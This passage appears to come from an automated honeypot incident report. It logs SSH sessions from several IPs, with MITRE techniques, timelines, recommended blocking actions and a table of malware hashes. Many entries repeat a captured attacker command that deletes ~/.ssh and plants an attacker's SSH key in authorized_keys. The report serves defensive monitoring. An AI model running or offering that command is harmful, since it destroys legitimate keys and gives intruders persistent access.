- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a066dd2abefa

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:44 |
| **Last Seen** | 2026-04-23 21:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:44:55` | `cowrie.session.connect` |
| `2026-04-23 21:44:55` | `cowrie.client.version` |
| `2026-04-23 21:44:55` | `cowrie.client.kex` |
| `2026-04-23 21:44:56` | `cowrie.login.success` |
| `2026-04-23 21:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b515c7f71874

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:44 |
| **Last Seen** | 2026-04-23 21:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:44:57` | `cowrie.session.connect` |
| `2026-04-23 21:44:57` | `cowrie.client.version` |
| `2026-04-23 21:44:57` | `cowrie.client.kex` |
| `2026-04-23 21:44:58` | `cowrie.login.success` |
| `2026-04-23 21:44:59` | `cowrie.session.params` |
| `2026-04-23 21:44:59` | `cowrie.command.input` |
| `2026-04-23 21:44:59` | `cowrie.command.failed` |
| `2026-04-23 21:44:59` | `cowrie.log.closed` |
| `2026-04-23 21:44:59` | `cowrie.session.params` |
| `2026-04-23 21:44:59` | `cowrie.command.input` |
| `2026-04-23 21:45:00` | `cowrie.session.file_download` |
| `2026-04-23 21:45:00` | `cowrie.log.closed` |
| `2026-04-23 21:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da58f389d344

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:45 |
| **Last Seen** | 2026-04-23 21:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:45:02` | `cowrie.session.connect` |
| `2026-04-23 21:45:02` | `cowrie.client.version` |
| `2026-04-23 21:45:03` | `cowrie.client.kex` |
| `2026-04-23 21:45:03` | `cowrie.login.success` |
| `2026-04-23 21:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0258bc931be6

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:50 |
| **Last Seen** | 2026-04-23 21:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:50:57` | `cowrie.session.connect` |
| `2026-04-23 21:50:57` | `cowrie.client.version` |
| `2026-04-23 21:50:57` | `cowrie.client.kex` |
| `2026-04-23 21:50:58` | `cowrie.login.success` |
| `2026-04-23 21:50:59` | `cowrie.session.params` |
| `2026-04-23 21:50:59` | `cowrie.command.input` |
| `2026-04-23 21:50:59` | `cowrie.command.failed` |
| `2026-04-23 21:50:59` | `cowrie.log.closed` |
| `2026-04-23 21:51:00` | `cowrie.session.params` |
| `2026-04-23 21:51:00` | `cowrie.command.input` |
| `2026-04-23 21:51:00` | `cowrie.session.file_download` |
| `2026-04-23 21:51:00` | `cowrie.log.closed` |
| `2026-04-23 21:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374ec7b47200

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:51 |
| **Last Seen** | 2026-04-23 21:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:51:02` | `cowrie.session.connect` |
| `2026-04-23 21:51:02` | `cowrie.client.version` |
| `2026-04-23 21:51:03` | `cowrie.client.kex` |
| `2026-04-23 21:51:04` | `cowrie.login.success` |
| `2026-04-23 21:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d36ac3588f39

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:53 |
| **Last Seen** | 2026-04-23 21:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:53:57` | `cowrie.session.connect` |
| `2026-04-23 21:53:57` | `cowrie.client.version` |
| `2026-04-23 21:53:57` | `cowrie.client.kex` |
| `2026-04-23 21:53:58` | `cowrie.login.success` |
| `2026-04-23 21:53:58` | `cowrie.session.params` |
| `2026-04-23 21:53:58` | `cowrie.command.input` |
| `2026-04-23 21:53:58` | `cowrie.command.failed` |
| `2026-04-23 21:53:58` | `cowrie.log.closed` |
| `2026-04-23 21:53:59` | `cowrie.session.params` |
| `2026-04-23 21:53:59` | `cowrie.command.input` |
| `2026-04-23 21:53:59` | `cowrie.session.file_download` |
| `2026-04-23 21:53:59` | `cowrie.log.closed` |
| `2026-04-23 21:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeeeb10f644b

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:54 |
| **Last Seen** | 2026-04-23 21:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:54:02` | `cowrie.session.connect` |
| `2026-04-23 21:54:02` | `cowrie.client.version` |
| `2026-04-23 21:54:02` | `cowrie.client.kex` |
| `2026-04-23 21:54:03` | `cowrie.login.success` |
| `2026-04-23 21:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2dee7fb68f2

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:54 |
| **Last Seen** | 2026-04-23 21:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:54:56` | `cowrie.session.connect` |
| `2026-04-23 21:54:56` | `cowrie.client.version` |
| `2026-04-23 21:54:57` | `cowrie.client.kex` |
| `2026-04-23 21:54:58` | `cowrie.login.success` |
| `2026-04-23 21:54:58` | `cowrie.session.params` |
| `2026-04-23 21:54:58` | `cowrie.command.input` |
| `2026-04-23 21:54:58` | `cowrie.command.failed` |
| `2026-04-23 21:54:58` | `cowrie.log.closed` |
| `2026-04-23 21:54:59` | `cowrie.session.params` |
| `2026-04-23 21:54:59` | `cowrie.command.input` |
| `2026-04-23 21:54:59` | `cowrie.session.file_download` |
| `2026-04-23 21:54:59` | `cowrie.log.closed` |
| `2026-04-23 21:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0d65f601aa

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:55 |
| **Last Seen** | 2026-04-23 21:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:55:02` | `cowrie.session.connect` |
| `2026-04-23 21:55:02` | `cowrie.client.version` |
| `2026-04-23 21:55:02` | `cowrie.client.kex` |
| `2026-04-23 21:55:03` | `cowrie.login.success` |
| `2026-04-23 21:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f38be400b1f2

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:55 |
| **Last Seen** | 2026-04-23 21:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:55:56` | `cowrie.session.connect` |
| `2026-04-23 21:55:56` | `cowrie.client.version` |
| `2026-04-23 21:55:56` | `cowrie.client.kex` |
| `2026-04-23 21:55:57` | `cowrie.login.success` |
| `2026-04-23 21:55:58` | `cowrie.session.params` |
| `2026-04-23 21:55:58` | `cowrie.command.input` |
| `2026-04-23 21:55:58` | `cowrie.command.failed` |
| `2026-04-23 21:55:58` | `cowrie.log.closed` |
| `2026-04-23 21:55:58` | `cowrie.session.params` |
| `2026-04-23 21:55:58` | `cowrie.command.input` |
| `2026-04-23 21:55:59` | `cowrie.session.file_download` |
| `2026-04-23 21:55:59` | `cowrie.log.closed` |
| `2026-04-23 21:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80a66525c4a5

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:56 |
| **Last Seen** | 2026-04-23 21:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:56:01` | `cowrie.session.connect` |
| `2026-04-23 21:56:01` | `cowrie.client.version` |
| `2026-04-23 21:56:02` | `cowrie.client.kex` |
| `2026-04-23 21:56:03` | `cowrie.login.success` |
| `2026-04-23 21:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418e7beaf542

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:57 |
| **Last Seen** | 2026-04-23 21:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:57:59` | `cowrie.session.connect` |
| `2026-04-23 21:57:59` | `cowrie.client.version` |
| `2026-04-23 21:57:59` | `cowrie.client.kex` |
| `2026-04-23 21:58:00` | `cowrie.login.success` |
| `2026-04-23 21:58:00` | `cowrie.session.params` |
| `2026-04-23 21:58:00` | `cowrie.command.input` |
| `2026-04-23 21:58:00` | `cowrie.command.failed` |
| `2026-04-23 21:58:01` | `cowrie.log.closed` |
| `2026-04-23 21:58:01` | `cowrie.session.params` |
| `2026-04-23 21:58:01` | `cowrie.command.input` |
| `2026-04-23 21:58:01` | `cowrie.session.file_download` |
| `2026-04-23 21:58:01` | `cowrie.log.closed` |
| `2026-04-23 21:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-293241ad3f1f

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:58 |
| **Last Seen** | 2026-04-23 21:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:58:04` | `cowrie.session.connect` |
| `2026-04-23 21:58:04` | `cowrie.client.version` |
| `2026-04-23 21:58:04` | `cowrie.client.kex` |
| `2026-04-23 21:58:05` | `cowrie.login.success` |
| `2026-04-23 21:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89bdd25f1e07

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 21:59 |
| **Last Seen** | 2026-04-23 22:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:59:57` | `cowrie.session.connect` |
| `2026-04-23 21:59:57` | `cowrie.client.version` |
| `2026-04-23 21:59:57` | `cowrie.client.kex` |
| `2026-04-23 21:59:58` | `cowrie.login.success` |
| `2026-04-23 21:59:59` | `cowrie.session.params` |
| `2026-04-23 21:59:59` | `cowrie.command.input` |
| `2026-04-23 21:59:59` | `cowrie.command.failed` |
| `2026-04-23 21:59:59` | `cowrie.log.closed` |
| `2026-04-23 21:59:59` | `cowrie.session.params` |
| `2026-04-23 21:59:59` | `cowrie.command.input` |
| `2026-04-23 22:00:00` | `cowrie.session.file_download` |
| `2026-04-23 22:00:00` | `cowrie.log.closed` |
| `2026-04-23 22:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4693dd925267

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 22:00 |
| **Last Seen** | 2026-04-23 22:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 22:00:02` | `cowrie.session.connect` |
| `2026-04-23 22:00:02` | `cowrie.client.version` |
| `2026-04-23 22:00:03` | `cowrie.client.kex` |
| `2026-04-23 22:00:03` | `cowrie.login.success` |
| `2026-04-23 22:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.200.228[.]35` | **27** | 2026-04-23 21:31 | 2026-04-23 22:00 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.31.38[.]83` | **26** | 2026-04-23 21:09 | 2026-04-23 21:46 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.103.202[.]193` | **26** | 2026-04-23 21:01 | 2026-04-23 21:24 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `128.203.201[.]254` | **2** | 2026-04-23 21:29 | 2026-04-23 21:29 | 0m | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
